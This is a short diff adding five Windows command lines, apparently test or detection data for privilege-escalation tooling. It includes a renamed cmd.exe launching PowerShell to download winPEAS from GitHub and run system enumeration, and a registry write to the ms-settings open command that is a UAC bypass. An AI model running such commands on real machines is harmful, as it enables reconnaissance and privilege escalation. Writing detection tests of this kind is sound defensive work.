@@ -1,0 +1,5 @@
+rundll32.exe legit.dll,#1
+winPEAS.exe
+copy cmd.exe not_a_peas.exe && not_a_peas.exe /c "powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/carlospolop/PEASS-ng/releases/download/20240515-39d7363c/winPEASany.exe', 'wp.exe'); start-process 'wp.exe' -ArgumentList 'systeminfo', 'userinfo', 'networkinfo'"
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "wp.exe" /f && dotnet wp.exe
+wpeas.exe
